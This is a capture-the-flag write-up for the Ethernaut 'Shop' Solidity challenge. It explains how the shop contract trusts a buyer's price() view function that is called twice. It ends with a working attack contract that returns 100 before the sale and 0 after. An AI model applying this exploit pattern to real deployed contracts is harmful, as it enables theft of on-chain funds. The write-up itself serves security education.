---
title: "Ethernaut 21 Shop"
description: "Ethernaut 21 Shop writeup"
---

## Challenge
### Description
Can you get the item from the shop for less than the price asked?
Things that might help:
Shop expects to be used from a Buyer
Understanding restrictions of view functions
### Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```
## Background

---

A `view` function declares that it will not change state. When you call an external contract's `view` function, the compiler usually uses `STATICCALL`, and attempting a state change within this context reverts.
In this challenge, the attacker's `price()` cannot change its behavior by modifying an internal state variable. The approach from the Elevator challenge, flipping a `bool` value so the first and second calls return different values, is blocked.
A `view` function can still read the current state of other contracts, though. So `price()` can read `Shop.isSold()` and return a different price depending on its value.

---

When a contract casts `msg.sender` to an interface and calls a function, the actual logic is decided by the called contract. The `IBuyer.price()` type only fixes the return type and the `view` constraint. Nothing guarantees that it returns the same value every time.
`Shop.buy()` calls the same external function `price()` twice, and changes the `isSold` state between the two calls. The attacker can observe this state change and return a value that passes the condition on the first call, and a low value that is actually stored on the second call.
## Code analysis

---

First, the part that treats `msg.sender` as the buyer contract:
```solidity
function buy() public {
  IBuyer _buyer = IBuyer(msg.sender);

  if (_buyer.price() >= price && !isSold) {
    isSold = true;
    price = _buyer.price();
  }
}
```
`buy()` casts `msg.sender` to `IBuyer` and then calls `_buyer.price()`. An EOA has no `price()` function, so you need to deploy an attack contract and have that contract call `buy()`.
`Shop` trusts the value returned by the external contract as-is. The name `price()` suggests a price lookup, but the attacker's logic decides what it returns.

---

The first `price()` call is used to pass the condition.
```solidity
if (_buyer.price() >= price && !isSold) {
```
The initial state is `price = 100`, `isSold = false`. So to pass the conditional, the first `price()` call must return at least 100.
Here, since `isSold` is still `false`, if the attacker's `price()` reads `Shop.isSold()` and returns `100`, the condition is satisfied. This call only reads and does not change state, so it does not trip the `view` constraint either.

---

The second `price()` call executes after the state change.
```solidity
isSold = true;
price = _buyer.price();
```
Once the condition passes, `Shop` first changes `isSold` to `true`, then calls `_buyer.price()` again and stores it in `price`.
Because of this ordering, on the second call the attacker's `price()` sees a different environment than the first. Now that `Shop.isSold()` is `true`, it returns `0`, and `Shop.price` ends up as `0`.
## Solution
`Shop.buy()` calls `price()` twice and changes `isSold` to `true` between the two calls. The attack contract's `price()` does not modify state directly; it only reads `Shop.isSold()`.
On the first call, `isSold == false`, so it returns `100` to pass the condition. Then after `Shop` changes `isSold = true` and calls `price()` a second time, the attack contract returns `0`. As a result, the final price drops to `0`.
The Elevator approach, keeping a `bool` state variable in the attack contract and flipping it on each call, does not work here because `price()` is called as `view`. Reading `isSold`, which `Shop` already changes, has the same effect.
### Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Attack {
    IShop shop;

    constructor(address _addr) {
        shop = IShop(_addr);
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (shop.isSold() == false) return 100;
        else return 0;
    }
}
```
![screenshot](./image-1.png)
